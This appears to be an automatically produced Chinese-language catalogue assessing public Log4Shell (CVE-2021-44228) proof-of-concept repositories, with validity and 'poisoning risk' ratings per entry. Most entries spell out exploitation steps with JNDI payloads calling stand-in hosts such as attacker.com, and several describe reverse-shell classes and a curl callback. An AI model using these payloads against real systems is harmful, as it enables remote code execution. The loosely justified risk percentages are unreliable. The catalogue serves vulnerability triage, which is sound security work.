**来源**: [CVE-2021-44228-d4ngkh04w_CVE-2021-44228-Apache-Log4j.md](../2021/CVE-2021-44228-d4ngkh04w_CVE-2021-44228-Apache-Log4j.md)

## CVE-2021-44228-Log4Shell-RCE

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行(RCE)

**影响应用:** Apache Log4j2

**危害等级:** 极高危，可能导致完全控制受影响的系统

**影响版本:** 2.0-beta9 到 2.15.0 (不包含安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用受影响版本的Log4j2，且启用了message lookup substitution功能。攻击者能够控制Log4j2记录的日志消息或参数。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-44228，又名Log4Shell，是一个存在于Apache Log4j2中的严重远程代码执行漏洞。该漏洞利用了Log4j2的JNDI（Java Naming and Directory Interface）特性，允许攻击者通过控制日志消息或参数，注入恶意的JNDI查找字符串。当Log4j2解析并执行这些字符串时，它会从攻击者控制的LDAP或其他JNDI服务下载并执行任意Java代码，从而实现远程代码执行。 

**有效性：**根据漏洞库信息和搜索结果，此漏洞影响广泛，且存在公开可用的漏洞利用代码，因此该漏洞的利用是有效的。

**投毒风险：**提供的Dockerfile用于构建包含app.jar的镜像。Exploit.java代码尝试建立一个反向shell连接到 `host.docker.internal` 的9000端口。该代码本身并没有发现明显的投毒行为，而是实现了漏洞利用的基本功能，即建立反向shell。`host.docker.internal` 在docker 容器中可以解析为主机的ip地址。因此，投毒风险评估为0%。

**利用方式：**
1.  攻击者找到一个应用程序，该程序使用易受攻击版本的Log4j2并记录用户可控的输入。
2.  攻击者将恶意JNDI查找字符串（例如 `${jndi:ldap://attacker.com/Exploit}`）注入到这些输入中。
3.  当Log4j2记录包含恶意字符串的日志消息时，它会尝试解析JNDI查找。
4.  Log4j2连接到攻击者控制的LDAP服务器（或其它JNDI服务）。
5.  攻击者的LDAP服务器返回一个指向恶意Java类的URL。
6.  Log4j2从URL下载并执行恶意Java类，从而实现远程代码执行。例如提供的Exploit.java。
7.  Exploit.java 代码，会尝试创建一个反向shell，连接到攻击者指定的 `host:port` ，从而控制目标系统。

**项目地址:** [d4ngkh04w/CVE-2021-44228-Apache-Log4j](https://github.com/d4ngkh04w/CVE-2021-44228-Apache-Log4j)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #25

**来源**: [CVE-2021-44228-fabioeletto_hka-seminar-log4shell.md](../2021/CVE-2021-44228-fabioeletto_hka-seminar-log4shell.md)

## CVE-2021-44228 - Apache Log4j2 JNDI 远程代码执行漏洞

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 高危，允许攻击者执行任意代码

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用了受影响版本的 Log4j2，并且启用了 message lookup substitution。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个严重漏洞，它允许攻击者通过 JNDI 注入执行任意代码。漏洞利用方式如下：

1.  **攻击者发送恶意请求：** 攻击者向目标系统发送一个包含特定格式的字符串（例如 `${jndi:ldap://attacker.com/exploit}`）的请求，这个字符串会被 Log4j2 记录。
2.  **Log4j2 解析恶意字符串：** 当 Log4j2 尝试记录包含`${jndi:...}`的字符串时，它会触发 JNDI lookup。
3.  **JNDI 发起 LDAP 查询：** JNDI 会根据 URL (例如 `ldap://attacker.com/exploit`) 发起 LDAP 查询请求攻击者控制的 LDAP 服务器。
4.  **LDAP 服务器返回恶意引用：** 攻击者的 LDAP 服务器返回一个包含恶意 Java 类的引用。
5.  **Log4j2 加载并执行恶意代码：** Log4j2 尝试从指定的 URL 加载并实例化这个 Java 类，从而执行攻击者提供的任意代码。

**有效性：**

根据提供的漏洞信息和搜索结果，该漏洞是真实存在的，并且存在公开可用的 PoC。提供的漏洞利用代码库是一个用于演示 Log4Shell 漏洞的教育项目，因此其有效性是为了演示漏洞而设计的。

**投毒风险：**

评估此代码库的投毒风险较低，约为 10%。

*   代码库的 `README.md` 文件明确声明其目的是为了教育和演示 Log4Shell 漏洞，并警告用户不要在生产环境中使用。
*   代码库结构清晰，主要包含一个易受攻击的 Spring Boot 应用程序 (`vulnerable-app`)，一个模拟恶意 LDAP 服务器的 `marshalsec` fork，和一个提供恶意 Java 类的 HTTP 服务器 (`payload-server`)。
*   虽然存在通过修改 `Exploit.class` 文件来植入恶意代码的可能性，但这种投毒行为相对容易被发现，因为其主要目的是演示漏洞，所以更可能是测试后门连接，并非投毒代码。
*   代码贡献者 Fabio Eletto 已经明确声明了代码的用途，降低了恶意使用的可能性。

但是，用户仍然需要谨慎使用此代码库，务必在隔离的环境中进行测试，并仔细审查代码以确保安全。

**项目地址:** [fabioeletto/hka-seminar-log4shell](https://github.com/fabioeletto/hka-seminar-log4shell)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #26

**来源**: [CVE-2021-44228-julian911015_Log4j-Scanner-Exploit.md](../2021/CVE-2021-44228-julian911015_Log4j-Scanner-Exploit.md)

## CVE-2021-44228-Apache Log4j2-JNDI注入

**漏洞编号:** CVE-2021-44228

**漏洞类型:** JNDI注入

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3 和 2.3.1)

**利用条件:** 目标系统使用了受影响的 Log4j2 版本，且允许 message lookup substitution

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228（Log4Shell）是 Apache Log4j2 中的一个严重漏洞，它允许攻击者通过 JNDI 注入执行远程代码。攻击者可以通过控制日志消息或日志消息参数，利用 JNDI 功能，从 LDAP 服务器加载恶意代码。 

**有效性：**
根据漏洞库信息和搜索结果，此漏洞是真实且已被广泛利用的。提供的 POC 代码尝试通过构造包含 JNDI 查找的恶意 payload，触发漏洞。

**投毒风险：**
代码主要功能是利用 Log4Shell 漏洞进行扫描和利用。虽然代码本身是为了利用漏洞，但存在一些潜在的风险，可能被恶意修改后进行投毒：

*   **Payload 修改：** 攻击者可以修改 payload，使其执行恶意操作，例如下载并执行其他恶意软件。
*   **LDAP 服务器：** 攻击者可能控制 LDAP 服务器，导致被攻击者下载恶意 payload。
*   **后门植入：** 攻击者可能会在扫描或利用过程中，通过漏洞在目标系统上植入后门，以便长期控制。

综合来看，代码本身具有一定的风险，需要谨慎使用。这里给出10%的投毒风险评估，因为代码的功能和目标较为明确，主要风险在于使用者可能被引导至恶意的LDAP服务器。

**利用方式：**

1.  **构建恶意 Payload：** 攻击者构造包含 JNDI 查找的字符串，例如 `${jndi:ldap://attacker.com/Exploit}`。
2.  **触发日志记录：** 将恶意 payload 注入到应用程序的日志消息中。这可以通过多种方式实现，例如通过 HTTP 请求头（User-Agent、X-Forwarded-For 等）、POST 请求参数或其他任何会被记录到日志中的输入。
3.  **JNDI 查找：** 当 Log4j2 尝试记录包含恶意 payload 的日志消息时，它会触发 JNDI 查找。
4.  **远程代码执行：** JNDI 查找会导致应用程序连接到攻击者控制的 LDAP 服务器，并下载和执行恶意代码。

提供的漏洞利用代码通过以下步骤尝试利用漏洞：

1.  **启动 LDAP 和 HTTP 服务器：** 使用 `JNDIExploit` 工具启动一个恶意的 LDAP 服务器，用于提供恶意 payload。同时启动一个 HTTP 服务器，用于托管 payload 文件。
2.  **扫描目标 URL：** 从指定的 URL 字典中读取 URL，并向这些 URL 发送包含恶意 payload 的 HTTP 请求。
3.  **注入 Payload 到 HTTP 头：** 将 payload 注入到 `X-Api-Version`、`User-Agent` 和 `X-Forwarded-For` 等常见的 HTTP 头中。
4.  **注入 Payload 到 URL 参数：** 将 payload 注入到 URL 参数中。

通过以上步骤，攻击者可以尝试触发目标应用程序的 Log4j2 漏洞，并执行远程代码。

**项目地址:** [julian911015/Log4j-Scanner-Exploit](https://github.com/julian911015/Log4j-Scanner-Exploit)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #27

**来源**: [CVE-2021-44228-khaidtraivch_CVE-2021-44228-Log4Shell-.md](../2021/CVE-2021-44228-khaidtraivch_CVE-2021-44228-Log4Shell-.md)

## CVE-2021-44228-Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行和完全系统控制

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用受影响的 Log4j2 版本，并且允许消息查找替换功能（默认启用）。攻击者需要能够控制 Log4j2 记录的日志消息或参数。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，又称 Log4Shell，是一个存在于 Apache Log4j2 中的远程代码执行漏洞。该漏洞源于 Log4j2 的 JNDI (Java Naming and Directory Interface) 功能，该功能允许在日志消息中执行 JNDI 查找。如果攻击者可以控制日志消息的内容，他们就可以注入恶意的 JNDI 查找字符串，从而导致 Log4j2 从攻击者控制的 LDAP 或其他 JNDI 服务加载并执行任意代码。

**有效性：**
根据漏洞库信息和搜索结果，CVE-2021-44228 是一个被广泛利用的严重漏洞。 搜索结果中提供了多个关于漏洞分析、缓解措施和利用的链接。虽然提供的漏洞利用代码仓库只包含一个 README.md 文件，信息很少。但考虑到CVE本身的严重性和公开性，判断存在有效的PoC。

**投毒风险：**
提供的漏洞利用代码仓库 `/tmp/b3e5418f03d45523b0a6001074bd0614/README.md` 只包含简单的描述信息 "CVE-2021-44228-Log4Shell-Kiểm thử xâm nhập" (越南语，意思是渗透测试)。**无法直接从该文件判断是否存在投毒代码。** 但从代码仓库的简洁程度来看，作者可能意图引导用户从其他渠道获取EXP，增加了恶意代码嵌入的可能性，**因此存在一定的投毒风险。风险评估为10%**。

**利用方式：**
漏洞利用的核心在于构造包含恶意 JNDI 查找的日志消息，例如：`${jndi:ldap://attacker.com/evil}`。当 Log4j2 记录包含此字符串的消息时，它会尝试连接到 `attacker.com` 上的 LDAP 服务器，并加载和执行从该服务器返回的 Java 代码。

**攻击步骤：**
1.  攻击者找到一个使用 Log4j2 的应用程序，该应用程序会将攻击者可控的数据记录到日志中。
2.  攻击者将包含恶意 JNDI 查找字符串的payload注入到应用程序的输入字段，例如 HTTP Header (User-Agent, X-Forwarded-For等等)、POST 参数、GET 参数或其他任何会被记录到日志中的数据。
3.  当应用程序记录包含该字符串的日志消息时，Log4j2 会尝试执行 JNDI 查找。
4.  如果应用程序配置允许，Log4j2 将连接到攻击者控制的 JNDI 服务器（例如 LDAP），并下载和执行恶意 Java 代码。

**缓解措施：**
*   升级 Log4j2 到 2.17.1 或更高版本。
*   如果无法升级，可以设置系统属性 `log4j2.formatMsgNoLookups=true` 或环境变量 `LOG4J_FORMAT_MSG_NO_LOOKUPS=true`，以禁用消息查找替换功能。
*   删除 `JndiLookup` 类。

**项目地址:** [khaidtraivch/CVE-2021-44228-Log4Shell-](https://github.com/khaidtraivch/CVE-2021-44228-Log4Shell-)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #28

**来源**: [CVE-2021-44228-mgueye3_Log4Shell.md](../2021/CVE-2021-44228-mgueye3_Log4Shell.md)

## CVE-2021-44228-Apache Log4j2-JNDI 注入

**漏洞编号:** CVE-2021-44228

**漏洞类型:** JNDI 注入

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 to 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标系统使用受影响的 Log4j2 版本，且允许出站网络连接。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-44228 (Log4Shell) 漏洞存在于 Apache Log4j2 中，由于其 JNDI 功能未对攻击者控制的 LDAP 和其他 JNDI 相关端点进行保护。攻击者可以控制日志消息或日志消息参数，从而在启用消息查找替换时执行从 LDAP 服务器加载的任意代码。

**有效性：**
根据漏洞库信息和大量已公开的漏洞利用案例，此漏洞的利用是有效的。大量资料表明，该漏洞在野外被广泛利用。

**投毒风险：**
提供的漏洞利用代码是一个JSON文件，其中包含一组flag，这些flag很可能是CTF挑战或者渗透测试演练中的结果，而不是实际的漏洞利用代码。因此，可以认为不存在投毒代码。

**利用方式：**
1.  攻击者构造包含 JNDI 查找表达式的恶意字符串，例如 `${jndi:ldap://attacker.com/evil}`。
2.  目标应用程序使用存在漏洞的 Log4j2 版本记录此字符串。
3.  Log4j2 尝试解析 JNDI 查找表达式，并连接到攻击者控制的 LDAP 服务器（或 RMI、DNS 等）。
4.  LDAP 服务器返回一个包含恶意 Java 类的响应。
5.  Log4j2 加载并执行该恶意 Java 类，从而导致远程代码执行。

需要注意的是，从 Log4j 2.15.0 开始，此行为已默认禁用。在 2.16.0 版本（以及 2.12.2、2.12.3 和 2.3.1）中，此功能已完全删除。


**项目地址:** [mgueye3/Log4Shell](https://github.com/mgueye3/Log4Shell)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #29

**来源**: [CVE-2021-44228-michaelsanford_Log4Shell-Honeypot.md](../2021/CVE-2021-44228-michaelsanford_Log4Shell-Honeypot.md)

## CVE-2021-44228-Log4Shell-Honeypot

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行和数据泄露

**影响版本:** 2.0-beta9 to 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标系统使用存在漏洞的Log4j2版本，且允许log message lookup substitution

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是一种严重的远程代码执行 (RCE) 漏洞，存在于 Apache Log4j 2.0-beta9 到 2.15.0 版本（不包括安全版本 2.12.2、2.12.3 和 2.3.1）中。该漏洞源于 Log4j2 JNDI 功能在配置、日志消息和参数中，未能充分保护免受攻击者控制的 LDAP 和其他 JNDI 相关端点的攻击。

**利用方式：**

攻击者可以控制日志消息或日志消息参数，从而执行从 LDAP 服务器加载的任意代码。这是通过在日志消息中插入包含 JNDI 查找的恶意字符串来实现的，例如 `${jndi:ldap://attacker.com/evil}`。当 Log4j2 处理此日志消息时，它会尝试连接到攻击者控制的 LDAP 服务器，并执行服务器返回的恶意代码。

**有效性：**

根据漏洞库信息、搜索结果以及漏洞利用代码，可以判断该漏洞利用的POC代码有效。网上存在大量的利用该漏洞的POC，并且该漏洞已被广泛利用。

**投毒风险：**

提供的代码是Log4Shell Honeypot，目的是为了检测和防御Log4Shell攻击，而不是利用Log4Shell进行攻击。Dockerfile 构建了一个 Python 应用，用于模拟易受攻击的 Log4j2 环境，通过检测特定模式（例如 `${jndi:`）来识别潜在的攻击。主要目的是捕获攻击尝试的相关信息，例如攻击来源 IP 地址、攻击载荷等。尽管从技术角度讲，可以修改该 Honeypot 以包含恶意代码，但从代码的主要功能来看，其目的在于防御，而不是攻击。虽然整体投毒风险较低，但如果有人修改了 Honeypot 的代码，增加了反向shell或者其他恶意代码，那么投毒风险会增加。因此，给出10%的投毒风险评估。

总而言之，这是一个高危漏洞，攻击者可以利用它来远程执行代码。但是，提供的代码是一个honeypot，旨在检测此类攻击，虽然存在被修改后用作恶意用途的可能，但是可能性相对较低。

**项目地址:** [michaelsanford/Log4Shell-Honeypot](https://github.com/michaelsanford/Log4Shell-Honeypot)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #30

**来源**: [CVE-2021-44228-moften_Log4Shell.md](../2021/CVE-2021-44228-moften_Log4Shell.md)

## CVE-2021-44228 - Apache Log4j2 Log4Shell JNDI注入

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0 (不包含安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用受影响的Log4j2版本，并且允许出站网络连接。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是一个关键的远程代码执行漏洞，存在于 Apache Log4j 2.0-beta9 到 2.15.0 版本中 (不包括安全版本 2.12.2、2.12.3 和 2.3.1)。此漏洞源于 Log4j2 JNDI 功能在配置、日志消息和参数中，未能防止攻击者控制的 LDAP 和其他 JNDI 相关端点。 攻击者可以通过控制日志消息或日志消息参数，在启用消息查找替换时，执行从 LDAP 服务器加载的任意代码。

**有效性：**
根据漏洞描述和提供的PoC代码，该漏洞的利用是有效的。PoC 通过 JNDI 注入 LDAP URL 来触发漏洞，从而导致远程代码执行。

**投毒风险：**
该仓库的投毒风险评估为10%。虽然PoC本身旨在演示漏洞利用，但 `Exploit.java` 包含执行 `curl http://TU_IP:9999/pwned` 的指令，表明攻击者可以轻易地替换成更具破坏性的命令。`main.py`脚本本身看起来没有明显的恶意代码，但如果攻击者修改`Exploit.java` 并诱导用户使用，则存在风险。 README中包含了从github上克隆`marshalsec`的步骤，如果`marshalsec`库被投毒，也会导致风险。因此，需要仔细审查和验证。

**利用方式：**
1.  **确定目标：** 找到使用易受攻击的 Log4j2 版本的应用程序。
2.  **构造Payload：** 构造包含 JNDI 查找的恶意字符串。例如： `${jndi:ldap://attacker.com/Exploit}`。
3.  **触发日志记录：** 将 Payload 注入到应用程序将会记录的输入字段中，例如 HTTP Headers (User-Agent, Referer, X-Forwarded-For), POST 参数等。
4.  **恶意LDAP服务器：**设置一个恶意的LDAP服务器，当Log4j2尝试去lookup这个URL的时候，从HTTP服务器上获取恶意的Java Class文件并执行。
5.  **远程代码执行：** Log4j2 将连接到攻击者的 LDAP 服务器，检索并执行恶意 Java 代码，从而允许攻击者在目标系统上执行任意命令。

请注意，成功利用此漏洞需要目标应用程序启用消息查找替换，并且能够解析 JNDI 查找。较高版本的 Log4j 默认禁用了此功能，从而缓解了此漏洞。

**项目地址:** [moften/Log4Shell](https://github.com/moften/Log4Shell)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #31

**来源**: [CVE-2021-44228-mr-won_Log4shell.md](../2021/CVE-2021-44228-mr-won_Log4shell.md)

## CVE-2021-44228 - Apache Log4j2 Log4Shell RCE

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 🔥 치명적 (CVSS 10.0) - 远程代码执行，完全控制受影响系统

**影响版本:** 2.0-beta9 ~ 2.14.1

**利用条件:** 目标系统使用了存在漏洞的Log4j2版本，且允许Log4j2记录攻击者可控的输入（例如，HTTP请求头、用户输入等），消息lookup substitution is enabled

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，又名Log4Shell，是一个存在于Apache Log4j2中的远程代码执行漏洞。攻击者通过将恶意的JNDI lookup字符串（例如 `${jndi:ldap://attacker.com:1389/exploit}`）注入到Log4j2可以记录的任何输入中，即可触发该漏洞。

**有效性：**

提供的漏洞利用代码包含一个README.md文件，该文件描述了Log4Shell漏洞的原理、影响、利用方式、检测和缓解措施。其中包含一个利用示例 `${jndi:ldap://attacker.com:1389/exploit}`，表明该POC有效，可用于触发漏洞。

**利用方式：**

1.  攻击者构造包含恶意JNDI lookup字符串的Payload，例如 `${jndi:ldap://attacker.com:1389/exploit}`。
2.  攻击者将该Payload注入到应用程序可以记录的任何输入点，例如HTTP请求头（User-Agent，X-Forwarded-For等）、POST请求参数、Web表单字段等。
3.  应用程序使用Log4j2记录包含该Payload的日志条目。
4.  Log4j2在处理日志条目时，解析JNDI lookup字符串，并尝试连接到攻击者控制的LDAP服务器 `attacker.com:1389`。
5.  攻击者的LDAP服务器返回一个指向恶意Java类的URL。
6.  Log4j2下载并执行该恶意Java类，导致远程代码执行。

**投毒风险：**
该README.md 文件分析报告本身不包含恶意代码，但存在潜在的投毒风险，该风险主要来自用户在使用git clone 下载源码时，如果攻击者控制了welk仓库,或者使用docker build 从Dockerfile构建docker镜像时，攻击者可以在Dockerfile中植入恶意代码。因此，代码仓库或镜像来源不可信的情况下，可能存在潜在的风险。因此该仓库中存在投毒代码的可能性较低，但不能完全排除(10%).

**项目地址:** [mr-won/Log4shell](https://github.com/mr-won/Log4shell)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #32

**来源**: [CVE-2021-44228-qw3rtyou_CVE-2021-44228_dockernize.md](../2021/CVE-2021-44228-qw3rtyou_CVE-2021-44228_dockernize.md)

## CVE-2021-44228 (Log4Shell)

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 应用程序使用受影响的 Log4j2 版本，并且启用了消息查找替换功能。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，也被称为Log4Shell，是一个严重的远程代码执行漏洞，存在于Apache Log4j2中。该漏洞源于Log4j2在配置、日志消息和参数中使用的JNDI功能没有对攻击者控制的LDAP和其他JNDI相关端点提供足够的保护。

**有效性：**

提供的POC代码有效。它设置了一个dockerized环境，包括一个易受攻击的Java应用程序和一个模拟攻击者的LDAP服务器和HTTP服务器。该POC演示了如何通过JNDI注入执行任意代码。

**投毒风险：**

评估该代码的投毒风险约为10%。主要考虑以下几点：

*   `attacker/Payload.java`: 包含反弹shell的代码，存在被恶意修改的可能。
*   `attacker/index.js`和`attacker/ldap-server.js`:  可能被修改为重定向或记录漏洞利用尝试，虽然不直接执行恶意代码，但可以收集信息。
*   虽然大部分代码的功能是明确的，但在`Payload.java`中嵌入更隐蔽的后门或数据收集行为是可能的。因此存在一定的投毒风险。

**利用方式：**

1.  攻击者向目标应用程序发送包含恶意JNDI查找字符串的请求。例如：`${jndi:ldap://attacker.com/Exploit}`。
2.  如果目标应用程序使用Log4j2记录该请求，它会尝试解析JNDI查找字符串。
3.  Log4j2通过JNDI连接到攻击者控制的LDAP服务器 (attacker.com)。
4.  LDAP服务器返回一个包含指向攻击者控制的HTTP服务器的Java类的引用。
5.  Log4j2从HTTP服务器下载并执行该Java类，从而允许攻击者在目标系统上执行任意代码。

**缓解措施：**

*   升级到Log4j 2.17.1 或更高版本（此版本完全移除了有问题的 JNDI 功能）。
*   在旧版本中，设置`log4j2.formatMsgNoLookups=true` 或移除`JndiLookup` 类。

**项目地址:** [qw3rtyou/CVE-2021-44228_dockernize](https://github.com/qw3rtyou/CVE-2021-44228_dockernize)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #33

**来源**: [CVE-2021-44228-redhuntlabs_Log4JHunt.md](../2021/CVE-2021-44228-redhuntlabs_Log4JHunt.md)

## CVE-2021-44228 - Apache Log4j2 Log4Shell 漏洞

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用了受影响版本的 Log4j2，并且允许 message lookup substitution。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，又名Log4Shell，是一个存在于Apache Log4j2中的高危远程代码执行漏洞。攻击者可以通过控制日志消息或日志消息参数，利用 JNDI 注入，从 LDAP 服务器加载并执行任意代码。  

**有效性：** 根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码（Log4JHunt），该漏洞是有效的，并且在野外被广泛利用。Log4JHunt工具旨在自动化检测Log4Shell漏洞。

**投毒风险：**  提供的漏洞利用代码仓库 (Log4JHunt) 主要是一个扫描器，用于检测 Log4Shell 漏洞。通过人工分析代码，发现代码本身存在后门的概率较低。但用户使用第三方工具，仍然存在一定的风险。

仓库中可能存在的潜在风险点：

*   **依赖风险:** 该工具依赖于第三方库，这些库可能存在未知的漏洞或被恶意篡改。但这种风险是普遍存在的，并非该仓库特有。
*   **配置错误风险:** 用户可能配置不当，例如将扫描结果泄露到公共渠道，或者使用弱口令的 DNS callback server，导致信息泄露或被恶意利用。
*   **恶意作者风险：** 作者可能在未来的版本中植入恶意代码，但目前没有证据表明存在这种情况。

综合考虑，此仓库的投毒风险较低，大约为10%。

**利用方式：**

1.  攻击者向目标系统发送包含恶意 JNDI 查找字符串的请求。例如：`${jndi:ldap://attacker.com/evil}`。
2.  如果目标系统使用受影响的 Log4j2 版本记录该请求，Log4j2 会尝试解析 JNDI 查找字符串。
3.  Log4j2 通过 JNDI 接口连接到攻击者控制的 LDAP 服务器 (attacker.com)。
4.  LDAP 服务器返回一个包含恶意 Java 类的响应。
5.  Log4j2 加载并执行该恶意 Java 类，导致远程代码执行。

**Log4JHunt 工具的使用方式：**

1.  使用 Log4JHunt 扫描目标系统，可以指定单个 URL 或包含 URL 列表的文件。
2.  Log4JHunt 会向目标系统发送包含恶意 JNDI 查找字符串的请求，并监控 DNS callback server 或 Canarytokens 服务，以判断目标系统是否存在漏洞。
3.  如果目标系统存在漏洞，Log4JHunt 会收到 DNS callback 或 Canarytokens 触发的通知。

**项目地址:** [redhuntlabs/Log4JHunt](https://github.com/redhuntlabs/Log4JHunt)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #34

**来源**: [CVE-2021-44228-safeer-accuknox_log4j-shell-poc.md](../2021/CVE-2021-44228-safeer-accuknox_log4j-shell-poc.md)

## CVE-2021-44228-Apache Log4j2-远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.0-beta9 to 2.15.0 (不包含 security releases 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标应用使用了存在漏洞的Log4j2版本，并且启用了message lookup substitution功能，攻击者能够控制日志消息或日志消息参数。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，又名Log4Shell，是一个存在于Apache Log4j 2中的高危远程代码执行漏洞。该漏洞源于Log4j2的JNDI功能，当message lookup substitution功能启用时，攻击者可以通过控制日志消息或日志消息参数，利用JNDI注入，从恶意的LDAP服务器加载并执行任意代码。

**POC有效性：**

根据提供的docker-compose.yaml文件和Dockerfile文件，该POC的目的是创建一个易受攻击的Log4j2 Web应用程序和一个攻击服务器。attack-server 搭建了一个恶意的JNDI服务，用于向目标应用返回恶意payload，实现远程代码执行。

vulnerable-application 使用了tomcat 镜像，部署了 log4shell.war 包，模拟存在漏洞的web应用。

所以POC代码是有效的。

**投毒风险：**

考虑到以下几点，投毒风险评估为10%：

*   **来源可疑：** 漏洞利用代码来自GitHub上公开的JNDI-Exploit-Kit 和 log4j-shell-poc仓库，并说明了原始repository。
*   **简单的命令执行:** JNDI-Exploit-Kit 的Dockerfile中，通过 `-C` 参数执行 curl 命令，如果攻击服务器被篡改或者受到中间人攻击，可能导致执行的命令被替换为恶意代码。
*   **网络依赖：** 该POC依赖于网络连接，如果攻击者可以控制网络流量，可能会劫持请求并注入恶意代码。

虽然存在风险，但是代码的目的相对明确,只是执行`curl` 命令，且给出了原始仓库地址，因此不认为主要目的是投毒，但存在被利用的可能性。

**利用方式：**

1.  攻击者向目标应用程序发送包含恶意JNDI lookup字符串的请求，例如：`${jndi:ldap://attacker.com/evil}`。
2.  目标应用程序使用Log4j2记录该请求，触发JNDI lookup。
3.  Log4j2通过JNDI向`attacker.com`的LDAP服务器发起请求。
4.  攻击者的LDAP服务器返回一个包含恶意Java类的JNDI引用。
5.  Log4j2加载并执行该恶意Java类，从而实现远程代码执行。

总结：该漏洞利用简单，危害巨大。POC的有效性高，但存在一定的投毒风险。

**项目地址:** [safeer-accuknox/log4j-shell-poc](https://github.com/safeer-accuknox/log4j-shell-poc)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #35

**来源**: [CVE-2021-44228-sec13b_CVE-2021-44228-POC.md](../2021/CVE-2021-44228-sec13b_CVE-2021-44228-POC.md)

## CVE-2021-44228-Log4Shell-RCE

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行(RCE)

**影响应用:** Apache Log4j2

**危害等级:** 极高危，可导致服务器完全控制

**影响版本:** <= 2.14.1 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 应用程序使用存在漏洞的Log4j2版本，且允许攻击者控制日志消息或日志消息参数。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228（Log4Shell）是一个严重的远程代码执行漏洞，存在于Apache Log4j2中。攻击者可以通过构造特殊的JNDI注入字符串，例如`${jndi:ldap://attacker.com/evil}`，当Log4j2记录此字符串时，会尝试通过JNDI从攻击者控制的LDAP服务器下载并执行恶意代码。这个漏洞利用的关键在于Log4j2的lookup substitution功能允许在日志消息中使用JNDI查找。漏洞库信息、搜索引擎结果和提供的PoC代码都证实了此漏洞的严重性和利用方式。

**有效性：**
提供的YAML格式的PoC代码有效，针对不同的应用场景（Apache Druid, Apache JSPWiki, CAS, Code42, Elasticsearch等）构造了特定的payload，通过发送包含JNDI注入字符串的请求，触发漏洞。

**投毒风险：**
